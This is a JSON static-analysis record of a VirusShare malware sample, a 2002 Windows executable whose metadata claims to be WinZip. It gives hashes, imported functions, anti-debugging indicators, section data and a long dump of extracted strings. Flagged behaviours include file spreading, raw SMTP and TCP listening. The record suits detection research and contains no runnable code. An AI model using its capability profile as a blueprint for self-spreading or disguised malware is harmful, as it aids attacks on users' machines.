{
    "docinfo": {},
    "filename": "VirusShare_577a4fffb2bbdc84b6f9894c9a51440f",
    "filesize": 118784,
    "filetype": "PE32 executable (GUI) Intel 80386, for MS Windows",
    "hashes": {
        "md5": "577a4fffb2bbdc84b6f9894c9a51440f",
        "sha1": "c7331ad9769f1d5a5687d802e3d23c4f31ac7ae6",
        "sha256": "54349890273b5df40f18888a0c90dd26fc5afff7a3dbb218a249ce3634c331ff"
    },
    "peinfo": {
        "behavior": [
            "Xor",
            "network_tcp_listen",
            "network_smtp_raw",
            "network_tcp_socket",
            "spreading_file",
            "win_mutex",
            "win_registry",
            "win_private_profile",
            "win_files_operation"
        ],
        "breakpoint": [
            "CloseHandle",
            "CopyFileA",
            "CreateDirectoryA",
            "CreateFileA",
            "CreateMutexA",
            "CreateThread",
            "DeleteFileA",
            "ExitProcess",
            "ExitThread",
            "FindFirstFileA",
            "FindNextFileA",
            "FindWindowA",
            "FindWindowExA",
            "GetCommandLineA",
            "GetCurrentProcess",
            "GetDriveTypeA",
            "GetModuleFileNameA",
            "GetModuleHandleA",
            "GetProcAddress",
            "GetStartupInfoA",
            "GetSystemDirectoryA",
            "GetTempFileNameA",
            "GetTempPathA",
            "GetVersionExA",
            "GetWindowsDirectoryA",
            "HeapAlloc",
            "LoadLibraryA",
            "MessageBoxA",
            "OpenProcess",
            "ReadFile",
            "RegCloseKey",
            "RegOpenKeyExA",
            "SetFilePointer",
            "Sleep",
            "TerminateProcess",
            "UnhandledExceptionFilter",
            "VirtualAlloc",
            "VirtualFree",
            "WSAStartup",
            "WaitForSingleObject",
            "WinExec",
            "WriteFile"
        ],
        "directories": {
            "debug": {},
            "export": [],
            "import": {
                "ADVAPI32.dll": [
                    {
                        "function": "RegCloseKey",
                        "offset": 4247552
                    },
                    {
                        "function": "RegEnumValueA",
                        "offset": 4247556
                    },
                    {
                        "function": "RegQueryValueExA",
                        "offset": 4247560
                    },
                    {
                        "function": "RegSetValueExA",
                        "offset": 4247564
                    },
                    {
                        "function": "RegOpenKeyExA",
                        "offset": 4247568
                    },
                    {
                        "function": "RegNotifyChangeKeyValue",
                        "offset": 4247572
                    }
                ],
                "KERNEL32.dll": [
                    {
                        "function": "GetModuleFileNameA",
                        "offset": 4247580
                    },
                    {
                        "function": "CreateDirectoryA",
                        "offset": 4247584
                    },
                    {
                        "function": "DeleteFileA",
                        "offset": 4247588
                    },
                    {
                        "function": "GetWindowsDirectoryA",
                        "offset": 4247592
                    },
                    {
                        "function": "lstrlenA",
                        "offset": 4247596
                    },
                    {
                        "function": "WaitForSingleObject",
                        "offset": 4247600
                    },
                    {
                        "function": "CreateThread",
                        "offset": 4247604
                    },
                    {
                        "function": "WinExec",
                        "offset": 4247608
                    },
                    {
                        "function": "CreateEventA",
                        "offset": 4247612
                    },
                    {
                        "function": "Sleep",
                        "offset": 4247616
                    },
                    {
                        "function": "CloseHandle",
                        "offset": 4247620
                    },
                    {
                        "function": "TerminateThread",
                        "offset": 4247624
                    },
                    {
                        "function": "ExitThread",
                        "offset": 4247628
                    },
                    {
                        "function": "WaitForMultipleObjects",
                        "offset": 4247632
                    },
                    {
                        "function": "FindNextChangeNotification",
                        "offset": 4247636
                    },
                    {
                        "function": "FindFirstChangeNotificationA",
                        "offset": 4247640
                    },
                    {
                        "function": "GetSystemDirectoryA",
                        "offset": 4247644
                    },
                    {
                        "function": "GetShortPathNameA",
                        "offset": 4247648
                    },
                    {
                        "function": "CopyFileA",
                        "offset": 4247652
                    },
                    {
                        "function": "GetLogicalDriveStringsA",
                        "offset": 4247656
                    },
                    {
                        "function": "SetFileAttributesA",
                        "offset": 4247660
                    },
                    {
                        "function": "GetTempFileNameA",
                        "offset": 4247664
                    },
                    {
                        "function": "GetTempPathA",
                        "offset": 4247668
                    },
                    {
                        "function": "SetThreadPriority",
                        "offset": 4247672
                    },
                    {
                        "function": "SetEvent",
                        "offset": 4247676
                    },
                    {
                        "function": "FreeLibrary",
                        "offset": 4247680
                    },
                    {
                        "function": "GetProcAddress",
                        "offset": 4247684
                    },
                    {
                        "function": "LoadLibraryA",
                        "offset": 4247688
                    },
                    {
                        "function": "GetModuleHandleA",
                        "offset": 4247692
                    },
                    {
                        "function": "GetLastError",
                        "offset": 4247696
                    },
                    {
                        "function": "CreateMutexA",
                        "offset": 4247700
                    },
                    {
                        "function": "SetLastError",
                        "offset": 4247704
                    },
                    {
                        "function": "TerminateProcess",
                        "offset": 4247708
                    },
                    {
                        "function": "GetExitCodeProcess",
                        "offset": 4247712
                    },
                    {
                        "function": "OpenProcess",
                        "offset": 4247716
                    },
                    {
                        "function": "WritePrivateProfileSectionA",
                        "offset": 4247720
                    },
                    {
                        "function": "GetPrivateProfileSectionA",
                        "offset": 4247724
                    },
                    {
                        "function": "GetPrivateProfileSectionNamesA",
                        "offset": 4247728
                    },
                    {
                        "function": "GetPrivateProfileIntA",
                        "offset": 4247732
                    },
                    {
                        "function": "GetDriveTypeA",
                        "offset": 4247736
                    },
                    {
                        "function": "GetVersionExA",
                        "offset": 4247740
                    },
                    {
                        "function": "WritePrivateProfileStringA",
                        "offset": 4247744
                    },
                    {
                        "function": "GetStartupInfoA",
                        "offset": 4247748
                    },
                    {
                        "function": "GetCurrentProcess",
                        "offset": 4247752
                    },
                    {
                        "function": "LCMapStringW",
                        "offset": 4247756
                    },
                    {
                        "function": "LCMapStringA",
                        "offset": 4247760
                    },
                    {
                        "function": "SetEndOfFile",
                        "offset": 4247764
                    },
                    {
                        "function": "GetOEMCP",
                        "offset": 4247768
                    },
                    {
                        "function": "GetACP",
                        "offset": 4247772
                    },
                    {
                        "function": "GetCPInfo",
                        "offset": 4247776
                    },
                    {
                        "function": "GetStringTypeW",
                        "offset": 4247780
                    },
                    {
                        "function": "SetEnvironmentVariableA",
                        "offset": 4247784
                    },
                    {
                        "function": "GetPrivateProfileStringA",
                        "offset": 4247788
                    },
                    {
                        "function": "CompareStringW",
                        "offset": 4247792
                    },
                    {
                        "function": "CompareStringA",
                        "offset": 4247796
                    },
                    {
                        "function": "GetVersion",
                        "offset": 4247800
                    },
                    {
                        "function": "CreateFileA",
                        "offset": 4247804
                    },
                    {
                        "function": "FlushFileBuffers",
                        "offset": 4247808
                    },
                    {
                        "function": "SetStdHandle",
                        "offset": 4247812
                    },
                    {
                        "function": "WriteFile",
                        "offset": 4247816
                    },
                    {
                        "function": "RtlUnwind",
                        "offset": 4247820
                    },
                    {
                        "function": "GetStringTypeA",
                        "offset": 4247824
                    },
                    {
                        "function": "MultiByteToWideChar",
                        "offset": 4247828
                    },
                    {
                        "function": "ReadFile",
                        "offset": 4247832
                    },
                    {
                        "function": "HeapFree",
                        "offset": 4247836
                    },
                    {
                        "function": "HeapReAlloc",
                        "offset": 4247840
                    },
                    {
                        "function": "HeapAlloc",
                        "offset": 4247844
                    },
                    {
                        "function": "GetTimeZoneInformation",
                        "offset": 4247848
                    },
                    {
                        "function": "GetSystemTime",
                        "offset": 4247852
                    },
                    {
                        "function": "GetLocalTime",
                        "offset": 4247856
                    },
                    {
                        "function": "FindFirstFileA",
                        "offset": 4247860
                    },
                    {
                        "function": "FindNextFileA",
                        "offset": 4247864
                    },
                    {
                        "function": "FindClose",
                        "offset": 4247868
                    },
                    {
                        "function": "FileTimeToSystemTime",
                        "offset": 4247872
                    },
                    {
                        "function": "FileTimeToLocalFileTime",
                        "offset": 4247876
                    },
                    {
                        "function": "ExitProcess",
                        "offset": 4247880
                    },
                    {
                        "function": "GetStdHandle",
                        "offset": 4247884
                    },
                    {
                        "function": "GetFileType",
                        "offset": 4247888
                    },
                    {
                        "function": "GetCommandLineA",
                        "offset": 4247892
                    },
                    {
                        "function": "UnhandledExceptionFilter",
                        "offset": 4247896
                    },
                    {
                        "function": "HeapDestroy",
                        "offset": 4247900
                    },
                    {
                        "function": "HeapCreate",
                        "offset": 4247904
                    },
                    {
                        "function": "VirtualFree",
                        "offset": 4247908
                    },
                    {
                        "function": "VirtualAlloc",
                        "offset": 4247912
                    },
                    {
                        "function": "SetFilePointer",
                        "offset": 4247916
                    },
                    {
                        "function": "FreeEnvironmentStringsA",
                        "offset": 4247920
                    },
                    {
                        "function": "FreeEnvironmentStringsW",
                        "offset": 4247924
                    },
                    {
                        "function": "WideCharToMultiByte",
                        "offset": 4247928
                    },
                    {
                        "function": "GetEnvironmentStrings",
                        "offset": 4247932
                    },
                    {
                        "function": "GetEnvironmentStringsW",
                        "offset": 4247936
                    },
                    {
                        "function": "SetHandleCount",
                        "offset": 4247940
                    }
                ],
                "MPR.dll": [
                    {
                        "function": "WNetCancelConnection2A",
                        "offset": 4247948
                    },
                    {
                        "function": "WNetOpenEnumA",
                        "offset": 4247952
                    },
                    {
                        "function": "WNetEnumResourceA",
                        "offset": 4247956
                    },
                    {
                        "function": "WNetAddConnection2A",
                        "offset": 4247960
                    },
                    {
                        "function": "WNetCloseEnum",
                        "offset": 4247964
                    }
                ],
                "RASAPI32.dll": [
                    {
                        "function": "RasEnumConnectionsA",
                        "offset": 4247972
                    },
                    {
                        "function": "RasGetConnectStatusA",
                        "offset": 4247976
                    }
                ],
                "USER32.dll": [
                    {
                        "function": "PostMessageA",
                        "offset": 4247984
                    },
                    {
                        "function": "FindWindowA",
                        "offset": 4247988
                    },
                    {
                        "function": "FindWindowExA",
                        "offset": 4247992
                    },
                    {
                        "function": "ShowWindowAsync",
                        "offset": 4247996
                    },
                    {
                        "function": "MessageBoxA",
                        "offset": 4248000
                    },
                    {
                        "function": "CharToOemA",
                        "offset": 4248004
                    },
                    {
                        "function": "GetWindowTextA",
                        "offset": 4248008
                    },
                    {
                        "function": "EnumWindows",
                        "offset": 4248012
                    }
                ],
                "WS2_32.dll": [
                    {
                        "function": "WSAStartup",
                        "offset": 4248020
                    },
                    {
                        "function": "gethostname",
                        "offset": 4248024
                    }
                ]
            },
            "relocations": {
                "Size": 0,
                "VirtualAddress": 0,
                "count": 0,
                "details": {}
            },
            "resources": [
                {
                    "data": "b'(\\x00\\x00\\x00 \\x00\\x00\\x00@\\x00\\x00\\x00\\x01\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xff\\xff\\xff\\x0000'",
                    "executable": false,
                    "language": "LANG_MACEDONIAN",
                    "name": "RT_ICON",
                    "offset": 123840,
                    "size": 2216,
                    "sublanguage": "SUBLANG_DEFAULT"
                },
                {
                    "data": "b'\\x00\\x00\\x01\\x00\\x01\\x00  \\x00\\x00\\x01\\x00\\x08\\x00\\xa8\\x08\\x00\\x00\\x01\\x00'",
                    "executable": false,
                    "language": "LANG_MACEDONIAN",
                    "name": "RT_GROUP_ICON",
                    "offset": 126056,
                    "size": 20,
                    "sublanguage": "SUBLANG_DEFAULT"
                },
                {
                    "data": "b'\\xcc\\x024\\x00\\x00\\x00V\\x00S\\x00_\\x00V\\x00E\\x00R\\x00S\\x00I\\x00O\\x00N\\x00_\\x00I\\x00N\\x00F\\x00O\\x00\\x00\\x00\\x00\\x00\\xbd\\x04\\xef\\xfe\\x00\\x00\\x01\\x00\\x00\\x00'",
                    "executable": false,
                    "language": "LANG_BULGARIAN",
                    "name": "RT_VERSION",
                    "offset": 123120,
                    "size": 716,
                    "sublanguage": "SUBLANG_DEFAULT"
                }
            ],
            "sign": {},
            "tls": {
                "AddressOfCallBacks": 65535,
                "AddressOfIndex": 4,
                "Characteristics": 0,
                "EndAddressOfRawData": 3,
                "SizeOfZeroFill": 184,
                "StartAddressOfRawData": 9460301
            }
        },
        "dll": false,
        "entrypoint": 28287,
        "features": {
            "antidbg": [
                "FindWindowA",
                "FindWindowExA",
                "GetLastError",
                "TerminateProcess",
                "UnhandledExceptionFilter"
            ],
            "antivm": {},
            "crypto": [],
            "mutex": [
                "CreateMutexA",
                "WaitForSingleObject"
            ],
            "packer": [
                "Microsoft_Visual_Cpp_v60",
                "Microsoft_Visual_Cpp_v50v60_MFC_additional",
                "Microsoft_Visual_Cpp_50",
                "Microsoft_Visual_Cpp_v50v60_MFC",
                "Armadillo_v4x",
                "Microsoft_Visual_Cpp"
            ],
            "xor": {}
        },
        "imagebase": 4194304,
        "imphash": "74be8f3cc2420c09c1cc608908d00ee8",
        "metadata": {
            "Comments": "",
            "CompanyName": "WinZip Computing",
            "FileDescription": "",
            "FileVersion": "8.2",
            "InternalName": "",
            "LegalCopyright": "Copyright \u00a9 2002",
            "LegalTrademarks": "",
            "OriginalFilename": "",
            "PrivateBuild": "",
            "ProductName": "",
            "ProductVersion": "8.2",
            "SpecialBuild": ""
        },
        "sections": {
            "count": 4,
            "details": [
                {
                    "characteristics": 1610612768,
                    "data": "b'V\\x8b\\xd1W\\x8b|$\\x0c\\x83\\xc9\\xff3\\xc0\\xf2\\xae\\xf",
                    "entropy": 6.435893543001501,
                    "executable": true,
                    "hash": {
                        "md5": "5d9fd4a834ed1381abf1a0e141433a73",
                        "sha1": "66361ff30979bd0887cde36aff90c35c5ed69382",
                        "sha256": "8f7348fca8ff4191307cf0bb28196ab91815c3806d04531328a0a0f01e35776a"
                    },
                    "section_name": ".text",
                    "size_of_raw_data": 49152,
                    "virtual_address": 4096,
                    "virtual_size": 46341
                },
                {
                    "characteristics": 1073741888,
                    "data": "b'`\\xdc\\x00\\x00n\\xdc\\x00\\x00~\\xdc\\x00\\x00\\x92\\xdc\\",
                    "entropy": 3.435927902506802,
                    "executable": false,
                    "hash": {
                        "md5": "59c4062c71e86b2623e72b3914f5fb15",
                        "sha1": "4ba80ad5c1e71a9802e24398b3d7499d4f445c2c",
                        "sha256": "2dd334cfdb634d0401690453401fc60c50398f203eec36b1b553c528217dad20"
                    },
                    "section_name": ".rdata",
                    "size_of_raw_data": 8192,
                    "virtual_address": 53248,
                    "virtual_size": 4312
                },
                {
                    "characteristics": 3221225536,
                    "data": "b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00",
                    "entropy": 5.371594354019513,
                    "executable": false,
                    "hash": {
                        "md5": "3bd8dce7cbef64a0bb2edef05c42af30",
                        "sha1": "c13f680a3ac90a802552967ca075d266d9684460",
                        "sha256": "53a40edfa7ff452c5dfaaa25cd097f214b8171c6a2b4b524a3a6176005d21a39"
                    },
                    "section_name": ".data",
                    "size_of_raw_data": 53248,
                    "virtual_address": 61440,
                    "virtual_size": 59512
                },
                {
                    "characteristics": 1073741888,
                    "data": "b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00",
                    "entropy": 2.396301942738935,
                    "executable": false,
                    "hash": {
                        "md5": "f4aa467f5e122a469402a3492762d053",
                        "sha1": "388c5a39bc107a56c0f5395d614b617c98ff7e18",
                        "sha256": "485205753a18e4ff8f11d311217646c2fc6770a63b48f22eaf4f4ed9af4d8c80"
                    },
                    "section_name": ".rsrc",
                    "size_of_raw_data": 4096,
                    "virtual_address": 122880,
                    "virtual_size": 3200
                }
            ]
        },
        "timestamp": "2002-08-26 17:32:08"
    },
    "strings": {
        "dump": [
            "L!This program cannot be run in DOS mode.",
            "+^bo01o01o01",
            "<1j01>1~01:1<01",
            "#1b01o11",
            "01;1g0161n01Richo01",
            ".text",
            "`.rdata",
            "@.data",
            ".rsrc",
            "VW|$",
            "SUVW",
            "R+T$",
            "L$$QUh0@",
            "t\t_^]",
            "_^]2[",
            "hfPQ",
            "VL$ j",
            "D$(L$$",
            "VRPQ",
            "SUVW",
            "33\u06cb$",
            "H3\u0485\u0249L$",
            "CuW|$",
            "3+\u064bO",
            "B;|_^][\u0104",
            "SUVL$",
            "_^][",
            "QUSV\u05cdUD$",
            "u_^][",
            "+F\u0249t$",
            "|$ 3I",
            "wx$ ",
            "+T$ \u0443O",
            "\u028dT$ ",
            "-SlK",
            "~9FPj",
            "T$(QPh8@",
            "_^]3[",
            "_^][",
            "3B7u",
            ";|Wx{#;|",
            "p#;}_",
            "SUVt$",
            "t~3+",
            "WSCL",
            ";}DWj",
            "Fu0@",
            "3S+|$$",
            "_^]2[",
            "t\u020b3S+\u044b|$$",
            "_^][",
            "3j@+hA",
            "L$TD$",
            "SUVWl$",
            "RUPQD$ ",
            "3\u06c5v\u0343",
            "3+\u044bA",
            "\\u?A",
            "3\u0443QhA",
            "L$ Qj",
            "oT$0hA",
            "u3L$",
            "_^][P",
            "SUVW$\\",
            "3I|)\\u",
            "3ID)@",
            "Ph8@",
            "P=$@",
            "tbhA",
            "UL$`h@",
            "T$hRr",
            "A\u06c9L$",
            "D$XP\u05c5t",
            "L$XPUh@",
            "P\u05cb$p",
            "u$j\\U/L",
            "+ID)",
            "L$Xj",
            "L$\\hA",
            "j\\hA",
            "tC-A",
            "\u04033IA",
            "+\u028d|$",
            "_^][T",
            "T$XQUh@",
            "D$Xj",
            "_^][T",
            "3SPVt$",
            "t$(D$",
            "RhH@",
            "Vh,@",
            "D$$j",
            "VQ\\$8",
            "D$dRPj",
            "QF\\$0\u054dT$dR\u8925",
            "D$ $h",
            "L$dPQ",
            "]uHT$",
            "L$lPh",
            "T$`SRj",
            "L$ 3QV$x",
            "tz=$@",
            "D$ $d",
            "PQT$hh@",
            "D$pP",
            "A\u06c9L$",
            "L$`Q\u05c5t",
            "T$ FRV$x",
            "L$ Qj",
            "Ph8@",
            "RhD$0$t",
            "PQT$xh@",
            "L$`j",
            "QRF\u05c3",
            "|_^[d",
            "PQRD$",
            "RPD$",
            "VQL$",
            "RT$(Pj",
            "D$ P",
            "SVW2$",
            "R}hDA",
            "P6hDA",
            "t!D$",
            "hp'@",
            "jP(A",
            "_^3[\u0114",
            "PR\u05c5u",
            "+P,A",
            "+PQ\u05c5u",
            "PR\u05c5u",
            "+P,A",
            "+PQ\u05c5u",
            "PR\u05c5u",
            "+P,A",
            "V54@",
            "\u058b50@",
            "Q\u058b5H@",
            "R_3^",
            "SU-@",
            "VWfD$",
            "\u054b\u0605t(@",
            "\u054b\u0605tj",
            "VGK.",
            "U-@@",
            "SUVWD$",
            "Ku-T@",
            "|jD$",
            "u\t2\u0114",
            "uph<@",
            "uLh,@",
            "u(h @",
            "SUVWPj@3",
            "3+T$",
            "Cu[|$",
            "3B;|L$",
            "3QWT$ h8@",
            "ta5@",
            "GQWT$ h8@",
            "u_^][",
            "SUVD$",
            "WP3h@",
            "\\$0\\$!\\$",
            "\\$\"\\$#\\$",
            "\\$ D$ ",
            "L$(Q)@",
            "T$,D$,RUh@",
            "PL$<Q?",
            "9-@A",
            "u)$D",
            "RSh,@",
            "l$$8\\$",
            "RPZ;",
            "3T$8+",
            "L$8Q",
            "D$8$<",
            ";tl@",
            ";t6@",
            "t`D$8j.P6",
            ";tML$8|$8+3It",
            "9+\u028d$d",
            "T$8$<",
            "RP$H",
            "Q\\$\"6",
            "SSW\\$\"\\$ E9",
            "3;~+|$",
            "t$W$@",
            "F;|j",
            "SWL9",
            "_^][X",
            "SUVD$",
            "PL$ fT$$",
            "Qh,@",
            "Nu)DA",
            "QPh8@",
            "3T$ +T$ ",
            "\u02cdD$ ",
            "3T$ +T$ ",
            "\u02cdD$ ",
            "+T$ ",
            "Qh,@",
            "L$,PQ3",
            "RSU4",
            "0\u040a$8",
            "t;$<",
            ".t1$<",
            "PQ$P",
            "QR$@",
            "QhHA",
            "j R7",
            "L$ Ph",
            "D$ Rh",
            "L$ $@",
            "QRh@",
            "+T$ ",
            "Qh,@",
            "L$,PQ1",
            "RSu2",
            "P\u040a$8",
            "u1$<",
            "j.P\t0",
            "QR$P",
            "QR$<",
            "QhHA",
            "T$ h",
            "L$ Qh",
            "_^][t6",
            "t%hLA",
            "SVWL$",
            "j\\hHA",
            "t3-HA",
            "\u04033IIA",
            "+\u028d$ ",
            "j\\hHA",
            "2\u06cdD$",
            "3PVL$",
            "t=T$",
            "FQVT$",
            "t&D$",
            "RhT@",
            "@PhT@",
            "tn$d",
            "32+T$",
            "Ph\\@",
            "m=@A",
            "_^[\\",
            "VPQh@",
            "Vh,A",
            "VhzA",
            "VhvA",
            "@VhrA",
            "VhpnA",
            "VhxjA",
            "VhDfA",
            "Vh8bA",
            "VhH^A",
            "@VhQA",
            "VhMA",
            "VhIA",
            "VhEA",
            "VhAA",
            "Vh=A",
            "Vh9A",
            "Vh5A",
            "@Vh1A",
            "VhL-A",
            "Vh<)A",
            "Vh A",
            "Vh`@",
            "Vhl@",
            "SUVWLA",
            "|$,\udb56\udd03",
            "2+$\\",
            "UD$\\h`A",
            "L$XQ$d",
            "/T$Xh",
            "RhXA",
            "_t{D$XL$XPj",
            "t^T$XR",
            "D$\\hHA",
            "L$X$\\",
            "t%DA",
            "3+T@",
            "L$XT$,Qj",
            "RD$ ",
            "D$X$`",
            "PUh@",
            "t#$`",
            "tTV!",
            "D$XPU",
            "|$X3T$",
            "L$X@QPT$4h8@",
            "RD$ 3",
            "kL$`T$4QPh8@",
            "D$pPU;|$x3 +T$",
            "3T$X+3\u06cb$d",
            "\u020dD$X",
            "L$XT$",
            "QRh8A",
            "ud|$",
            "stD$XL$,PQ#",
            "u^|$X+$d",
            "EC0@",
            "}_|$",
            "ED$X3PV$l",
            "tNVT$",
            "D$XL$",
            "PQh8A",
            "T$XFRV$l",
            "L$\\Qh4A",
            "T$Xh0A",
            "3\u06c5t~",
            "33+O",
            "3+h0A",
            "Cu$\\",
            "Ph4A",
            "L_^][T",
            "<u0hDA",
            "u0hDA",
            "u0hDA",
            "Fu0hDA",
            "3WPA",
            "3\u024dT$",
            "QPRC",
            "33fN",
            "3+\u047fPA",
            "+\u047fPA",
            "+\u047fPA",
            "+\u047fPA",
            "UVWhTA",
            "+\u044bPA",
            "Qh0A",
            ";u;|$",
            "QRP,",
            "T$(3RS$",
            "L$(h@",
            "RD$0hA",
            "|$(+\u0443O",
            "PL$0hA",
            "D$(CPS$",
            "hPH@",
            "T$8U",
            "D$(3PUh8@",
            "L$(hA",
            "D$(Rj",
            "PZ$x",
            "T$8Qj",
            "RA$H",
            "L$HPj",
            "D$XRj",
            "Qh\u0415A",
            "RPPD$(h\u0215A",
            "#u $",
            "RPZs",
            "Qh\u0215A",
            "gL$($",
            "D$(EPUh8@",
            "Ph0A",
            "1[_^]\u0118\t",
            "SUVW",
            "+UT$T",
            "L$TPh8@",
            "u4$X",
            "Qh\\A",
            "u4$X",
            "u4$X",
            "Qh\u0524A",
            "u;$X",
            "T$$R",
            "u+$X",
            "u+$X",
            "Wu4$X",
            "u4$X",
            "u4$X",
            "u.$X",
            "u.$X",
            "u.$X",
            "u'$X",
            "t!|$",
            "_^][@",
            "SUVW3j",
            "l$(l$8D$",
            "D$4\u867fj",
            "D$@\u833f",
            "3+T@",
            "T$08A",
            "RhtA",
            "8|$0",
            "D$H8A",
            "PhT@",
            "PhlA",
            "QhdA",
            "Rl$$",
            ";|$D",
            "Wh@A",
            "Wh0A",
            "WD$@h A",
            "WD$4h",
            "WD$<\u0585\u06c9D$@",
            "PQVT$<j",
            "3|$L",
            "|$|\udb6c\udf44$",
            "D$PL$T~<",
            "D$|\u01c4$",
            "t$tD$x",
            "\u04c5tOD$",
            "\u04c5t:L$",
            "\u04c5t%T$08A",
            "BRhtA",
            "_^][\u0110",
            "|$4Pj",
            "Q\u05c5uoL$",
            "QT$Xu&D$",
            "9p u",
            "P\u05c5tT$",
            "RT$X",
            "D$ L$$;",
            "\u04c9pL$ Q",
            "HT$ J",
            "S;l$(|bD$",
            "T$Pj",
            "T$@t+~'s",
            "D$ 3@D$ ",
            "3;\u03c9|$<",
            "T$$L$ ;",
            "\u02c9pT$ J$T9",
            "PL$ Q$L:",
            "R;l$(|\\L$",
            "D$Pj",
            "T$@t+~'s",
            "D$ 3@D$ D$",
            "L$<A",
            "P L$<;",
            "D$$L$ ;|",
            "PT$Pu",
            "~^L$$D$ ;}RD$",
            "T$Pj",
            "T$@t,~(s",
            "RT$HD$DP",
            "_^][\u0110",
            "_^][\u0110",
            "t\t0A",
            "SUVWa",
            "Uh\u0529A",
            "Uh\u0129A",
            "U\u0585D$",
            "_^]2[8",
            "|$@3$D",
            "tPD$$Pj",
            "\u04cbt<L$",
            "QUT$",
            "_^]2[8",
            "3T$`UVW",
            "L$0QV",
            "T$,R^d",
            "3PUL$xh0A",
            "tn=@",
            "D$0RP",
            "V\u05cdL$",
            "EQUT$xh0A",
            "u[_^",
            "hp^@",
            "YY^j",
            "^S\\$",
            "UVWu",
            ";5|A",
            "wDVSU",
            "Yt$CH;r",
            "tACH;r",
            "_^][SVt$",
            "3w*;",
            "Yu+Vj",
            "u\"=A",
            "_^[3U",
            "fEf;",
            "u;fEf;",
            "u.fEf;",
            "u!fEf;",
            "fEf;",
            "VWu@A",
            "U SVu",
            "3Y}j",
            "B_+^",
            "#[5A",
            "w\"t$",
            "Yu3Vt$",
            ";5|A",
            "^Vt$",
            ":t4Vb",
            "j@t$",
            "UWVu",
            "r)$(e@",
            "$@d@",
            "$8e@",
            "r$(e@",
            "r$(e@",
            "r$(e@",
            "DDDDDDDDDDDDDD",
            "$(e@",
            "t1|9",
            "$pf@",
            "+$e@",
            "r$f@",
            "r$f@",
            "Z$f@",
            "^_UVWu",
            "_^]UW}",
            "3AOE",
            "_U E",
            "VEEE",
            "YY^\u030bL$",
            "tOL$",
            "u^[_3",
            "F8u~a",
            "8u\u010aA",
            "8t3^[_C",
            "G^[_",
            "^[_U@",
            "PVo$",
            "^_U@",
            "3^t$",
            "tKMQP",
            "t<EPEP",
            "Vt*u",
            "^_[];}",
            "u3Vt$",
            "to|$",
            "_^SUVW|$",
            "7G-t",
            "7G3\u06c3=A",
            "7G\u03c3-u",
            "_^][t$",
            "SVEWP",
            "EjdY",
            "_9=A",
            "u<pA",
            "Vq;r",
            ";5pA",
            "s^h @",
            "YYh(@",
            "YY[u",
            "_Vt$",
            "^\u030dB[",
            "B8t\u0444tQ",
            "u^_[3",
            "B8t6t8t't",
            "t^_B[",
            "B^_[",
            "B^_[",
            "B^_[USVWu",
            "_^H[]Ujh@",
            "XSVWe",
            "Hu\u040dEP",
            "XPuVV",
            "EP6E",
            "\tMPQ",
            "eu(=A",
            "j?I_M",
            "!|D\tu+M",
            "j?_M",
            "j?UIZ;\u0289M",
            ";tkMQ",
            "!TD\tu+M",
            "u\t9}",
            "\t8]E",
            "HCPA",
            "ulSj",
            "_^[U",
            "3uELA",
            ";#M#",
            "r;]uy;\u0609]",
            ";#M#",
            ";uY;]s",
            ";]u&;\u0609]",
            "|D#M#",
            "pD#U#ue",
            "tU3i",
            "MLD#u",
            "j #M_|",
            "j?^;",
            "ua }+",
            "\u04c9]#\\D\\D",
            "M\t|D/}",
            "\t7Mt",
            "VW3;u0DP",
            "P5XA",
            "W5\\A",
            "W5\\A",
            "_^UQM",
            "SVWq",
            "Cj?i",
            ";w<G",
            "H;v\u01cbEO",
            "_^[U",
            "SVW}",
            "MOI;M",
            "\\9|9]",
            "I?Mv",
            "j?YM_",
            "uH s",
            "!\\D\tu+M",
            "OL1?v",
            "j?_]",
            "BD2G",
            "K\\3u",
            "NK?v",
            "j?^E",
            "j?^O",
            "uG s",
            "j?^M|",
            "\t9DD",
            "X_^[",
            "X3UWVu",
            "r)$|@",
            "$<|@",
            "r$|@",
            "r$|@",
            "r$|@",
            "DDDDDDDDDDDDDD",
            "t1|9",
            "$@~@",
            "+$H}@",
            "$@~@",
            "r$@~@",
            "r$@~@",
            "Z$@~@",
            "$@~@",
            "^_\u030bT$",
            "tG3D$",
            "GJuD$",
            "U$S]",
            "t } u =A",
            "EPY!",
            "[SUVW|$",
            ";=@A",
            "tiW%",
            "Y;Yt",
            "t\tU#",
            "_^][Vt$",
            "^Vt$",
            "Y^V#",
            "3^SVt$",
            ">+~&WPv",
            "_^[j",
            "YSVW33395 A",
            "t0|$",
            "P.Yt",
            "F;5 A",
            "_^[UQQSV5A",
            "3\u06c9]]",
            "rt`+tE",
            "@u}@",
            "rbtHHt.",
            "u@u;@S9]u.E",
            "<9]u",
            "SUV333;W~]",
            ";|?4$j ",
            "_^][Vt$",
            "YtwA",
            "uR<A",
            "SW<A",
            "u SY",
            "X_[^3^",
            "Vt\"t$",
            "t)Vf",
            "Y^UH",
            "SVW}",
            "G\u06c9uu}",
            "Mu39U",
            "MU\u0309U\u0609UUUUx",
            "*u#E",
            "\u02cdDA\u0409E",
            "It.ht lt",
            "GGM}",
            "HHtpHHtl",
            " M@;\u0289}",
            "Pt;0",
            "PP}$",
            "E}2E",
            ")Zt2\ttH",
            "Yt3H",
            "uHM@E",
            "PPEP",
            "t]EE0",
            "EHEE",
            "E Yt\tfMf",
            "YAE t!E@E",
            "Y3E@t",
            "EEEM",
            "t;ERPWVEU\"",
            "u\u010b\u06030uWV",
            "]\u050bEM",
            "\ubd4dE+EEE",
            "M90u",
            "]@t&",
            "u+u+u",
            "EPEu",
            "~;E]xf",
            "CPEPC ",
            "YY~2MQu",
            "Vj q",
            "E_^[@",
            "]VW|$",
            "O~!t$",
            "_^S\\$",
            "KVW~&|$",
            "WFt$",
            "f@USVu",
            "WtdF",
            "WPSm",
            "_WPS",
            "^[]W|$",
            "tAt#t",
            "tt4t'",
            "_Vt$",
            "u\tV^",
            "tltgV",
            "VWss\u020b",
            "tVPY",
            "3t\tP.",
            "_^[U",
            "SVW}",
            "E|[W",
            "]t)\u058b",
            "t(;s\":",
            ")EEM",
            "_^[UQE",
            "ARV5A",
            "QPEPj",
            "u\tD$",
            "S\u060bD$",
            "UQSVW}",
            "t\";\u060br",
            "VnYuy}",
            "+;r>})E",
            "PYYt.E",
            "tAt2t$",
            "\u034dAL$",
            "+USu",
            "4I+\u044d4A",
            "Y54A",
            "4I4A",
